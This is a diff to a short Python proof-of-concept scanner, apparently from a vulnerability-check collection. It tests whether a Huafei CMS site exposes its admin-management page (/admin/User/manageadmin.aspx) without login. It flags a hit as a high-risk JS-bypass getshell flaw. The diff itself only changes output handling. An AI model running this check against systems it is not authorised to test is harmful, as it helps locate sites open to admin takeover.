@@ -8,8 +8,8 @@ description: /admin/User/manageadmin.aspx 禁用JS可以直接访问。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class huaficms_bypass_js_BaseVerify:
     def __init__(self, url):
@@ -25,12 +25,12 @@ class huaficms_bypass_js_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             
             if req.status_code == 200 and r"addadmin.aspx" in req.text:
-                cprint("[+]存在华飞科技cms绕过JS GETSHELL漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在华飞科技cms绕过JS GETSHELL漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = huaficms_bypass_js_BaseVerify(sys.argv[1])
     testVuln.run()
